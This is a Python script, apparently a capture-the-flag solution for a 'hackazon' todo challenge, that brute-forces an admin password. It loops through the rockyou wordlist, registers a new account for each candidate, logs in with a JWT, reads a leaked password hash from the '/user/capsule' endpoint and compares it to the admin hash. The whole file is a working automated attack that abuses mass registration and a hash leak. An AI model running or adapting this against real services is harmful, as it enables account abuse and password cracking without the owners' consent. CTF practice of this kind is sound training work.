from pwn import *
import requests
import json

# Change between info/debug for more verbosity
context.log_level = 'debug'

url = 'https://todo.challenge.hackazon.org'
wordlist = open('/usr/share/wordlists/rockyou.txt', 'r')
admin_pw = '-432570933'  # Got this from part 1 of challenge

for count, password in enumerate(wordlist):
    headers = {}
    password = password.strip()
    if password:
        # Creds to try
        credentials = {
            'username': 'y' + str(count),
            'email': str(count),
            'password': password
        }

        # Register new account
        response = requests.post(url + "/user/register", json=credentials)
        del credentials['email']  # Don't need email to login

        # Login with new account
        response = requests.post(url + "/user/login", json=credentials)

        # Assign JWT token as auth header
        headers['Authorization'] = 'Bearer ' + json.loads(response.text)['token']

        # Get capsule spec
        response = requests.get(url + "/user/capsule", headers=headers)

        # Extract the password
        hashed_pw = json.loads(response.text)['data'][0]['password']
        debug(admin_pw + ': ' + hashed_pw + ' (' + password + ')')

        # If we get a match, quit!
        if hashed_pw == admin_pw:
            print("Success! Correct password was: " + password)
            wordlist.close()
            quit()

        # Track progress / performance
        if((count + 1) % 100 == 0):
            print(str(count + 1) + " attempts so far..")

# Maybe we need new password list?
print("Failed to find correct password :(")
wordlist.close()
